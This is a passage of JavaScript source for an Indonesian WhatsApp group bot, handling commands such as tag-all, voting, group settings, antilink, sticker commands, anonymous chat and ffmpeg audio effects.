                danta.sendMessage(m.chat, { image: buf, caption: `Made by DANTA` }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
            case 'tagall': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                teks += `⭔ @${mem.id.split('@')[0]}\n`
                }
                danta.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'upswteks':
if (!isCreator && !mek.key.fromMe) return sticOwner(from)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    danta.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            danta.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `⭔ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*╠➥ ${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*╠➥ ${prefix}upvote* - untuk ya\n*╠➥ ${prefix}devote* - untuk tidak\n*╠➥ ${prefix}cekvote* - untuk mengecek vote\n*╠➥ ${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${vote[m.chat][1].length}

 
└────

┌〔 DEVOTE 〕
 
├ Total: ${vote[m.chat][2].length}

 
└────

*╠➥ ${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `╠➥ ${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `╠➥ ${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: danta.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            danta.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*╠➥ ${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

┌〔 DEVOTE 〕
 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

*╠➥ ${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `╠➥ ${prefix}upvote`, buttonText: {displayText: '𝚄𝙿??𝙾𝚃𝙴'}, type: 1},
              {buttonId: `╠➥ ${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: danta.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            danta.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*╠➥ ${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

┌〔 DEVOTE 〕
 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

*╠➥ ${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `╠➥ ${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `╠➥ ${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: danta.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            danta.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*╠➥ ${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

┌〔 DEVOTE 〕
 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

*╠➥ ${prefix}hapusvote* - untuk menghapus vote


©${danta.user.id}
`
danta.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*╠➥ ${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await danta.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`*Sukses Menutup Group*`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await danta.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`*Sukses Membuka Group*`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open kh?' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close kh?' }, type: 1 }
                    ]
                    await danta.sendButtonText(m.chat, buttons, `Mode Group`, danta.user.name, m)

             }
            }
            break
            case 'infobot': {
            m.reply('Bot ini merupakan open-source bot dengan nama asli Hisoka-Morou yang tersedia di GitHub secara gratis Owner/hoster dari bot ini terlepas dari tanggung jawab dan pengawasan developer (Danta Dev) Owner/hoster boleh menjiplak, menambahkan, menghapus, mengganti source code dengan catatan *tidak memperjualbelikannya* dalam bentuk apapun. Apabila terjadi sebuah error, orang yang pertama yang harus kalian hubungi ialah owner/hoster. Jika kalian ingin berkontribusi dalam projek ini, Contact person: wa.me/6281356484612 (Developer) ')
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await danta.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Sukses Membuka Edit Info Group*`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await danta.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Sukses Menutup Edit Info Group*`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open kh?' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close kh?' }, type: 1 }
                    ]
                    await danta.sendButtonText(m.chat, buttons, `Mode Edit Info`, danta.user.name, m)

            }
            }
            break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`*Sudah Aktif kak Sebelumnya*`)
                db.data.chats[m.chat].antilink = true
                m.reply(`*Antilink Sekarang Aktif !*`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`*Sudah Tidak Aktif Sebelumnya*`)
                db.data.chats[m.chat].antilink = false
                m.reply(`*Antilink Sekarang Tidak Aktif !*`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await danta.sendButtonText(m.chat, buttons, `Mode Antilink`, danta.user.name, m)
                }
             }
             break
             case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkyt': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return m.reply('Already activated')
ntilinkytvid.push(from)
m.reply('Success in turning on youtube video antilink in this group')
var groupe = await danta.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
danta.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return m.reply('Already deactivated')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
m.reply('Success in turning off youtube video antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await danta.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${danta.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${danta.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await danta.sendButtonText(m.chat, buttons, `Mute Bot`, danta.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await danta.groupInviteCode(m.chat)
                danta.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\n👾Link Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await danta.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await danta.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                danta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'report': case 'lapor': {
            	if (!text) throw `Example : ${prefix + command} Lapor Ada Fitur Yang error`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Pesan Dari : @${me.split('@')[0]} \nUntuk : @${ownernya.split('@')[0]}\n\n${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🙏THANKS LAPORANNYA' }, type: 1 }]
            await danta.sendButtonText(ownernya, buttons, pjtxt, nyoutube, m, {mentions: ments})
            let akhji = `Laporan Telah Terkirim\nKe Owner @${ownernya.split('@')[0]}\n*Terima Kasih Laporannya🙏*\n_Nomermu Akan Terblokir_\n_Jika Laporan Hanya Di Buat Buat_`
            await danta.sendButtonText(m.chat, buttons, akhji, nyoutube, m, {mentions: ments})
            }
            break
            case 'hehehe': {
                reactionMessage = {
                    react: {
                        text: '❤',
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                danta.sendMessage(m.chat, reactionMessage)
            }
            break  
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await danta.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 danta.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await danta.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 danta.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    danta.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
        case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await danta.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                danta.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                danta.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ╠➥ ${prefix}getmsg ${text}

Lihat list Pesan Dengan ╠➥ ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ╠➥ ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                danta.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
        case 'grupsetting':
            case 'groupsetting':{
                    let sections = []
                    let com = [`group enable`,`leveling on`,`autosticker enable`,`welcome on`,`antilink on`]
                    let comm = [`group disable`,`leveling off`,`autosticker disable`,`welcome off`,`antilink off`]
                    let listnya = [`Group open/close`,`Leveling on/off`,`Auto-Sticker on/off`,`Welcome on/off`,`antilink on/off`]
                    let suruh = [`Enable`, `Disable`]
                    let fiturname = [`Group`,`Leveling`,`AutoSticker`,`Welcome`,`Antilink`]
                    let startnum = 0; let startnu = 0; let startn = 0;let start = 0
                    let startnumm = 1
                    for (let x of com) {
                        const yy = {title: `${listnya[startnum++]}`,
                    rows: [
                       {
                        title: `${suruh[0]}`,
                        description: `Mengaktifkan ${fiturname[startnu++]}`,
                        rowId: `${prefix}${x}`
                      },{
                        title: `${suruh[1]}`,
                        description: `Menonaktifkan ${fiturname[startn++]}`,
                        rowId: `${prefix}${comm[start++]}`
                      }
                    ]
                   }
                        sections.push(yy)
                    }
                    const sendm =  danta.sendMessage(
      from, 
      {
       text: "Group Settings",
       footer: "Only Admin Yak",
       title: "Atur Settingan Grup anda disini......",
       buttonText: "Click Button",
       sections
      }, { quoted : m }
    )  
}
  break
	    case 'anonymous': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                danta.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await danta.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, danta.user.name, m)
            }
			break
            case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await danta.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await danta.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await danta.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, danta.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await danta.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, danta.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await danta.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, danta.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await danta.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, danta.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await danta.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await danta.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await danta.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, danta.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await danta.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, danta.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await danta.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, danta.user.name, m)
                }
                break
            }
            case 'mode': {
            if (!isCreator) throw mess.owner
            m.reply('*SELF OR PUBLIC*')
            let buttons = [{ buttonId: 'public', buttonText: { displayText: 'PUBLIK' }, type: 1 },{ buttonId: 'self', buttonText: { displayText: 'SELF' }, type: 1 }]
            document: fs.readFileSync('./media/doc/fake.pptx'),
             danta.sendMessage(m.chat, buttons, {quoted: fkontak})
            	}
            break
            case 'public': {
                if (!isCreator) throw mess.owner
                danta.public = true
                m.reply('*Sukse Change To Public Usage*')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                danta.public = false
                m.reply('*Sukses Change To Self Usage*')
            }
            break
            case prefix+'ping':
            case prefix+'p':
                await danta.sendText(from, `Pong!\n*Speed: ${runtime(process.uptime())} secs*`)
            break
            case 'runtime': {
            	let lowq = `*𝐛𝐨𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐚𝐜𝐭𝐢𝐯𝐞 𝐟𝐨𝐫*\n*${runtime(process.uptime())}*`
                let buttons = [{ buttonId: '𝐝𝐨𝐧𝐚𝐬𝐢', buttonText: { displayText: '👑SEWA' }, type: 1 }]
                await danta.sendButtonText(m.chat, buttons, lowq, nyoutube, m, {quoted: fkontak})
            	}
            break
            case 'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
            case 'owner': case 'creator': {
                danta.sendContact(m.chat, global.owner, m)
            }
            break
            case 'setmenu': {
            if (!isCreator) throw mess.owner
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                setbot.templateImage = true
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateVideo'){
                setbot.templateImage = false
                setbot.templateVideo = true
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateGif'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = true
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateMessage'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = true
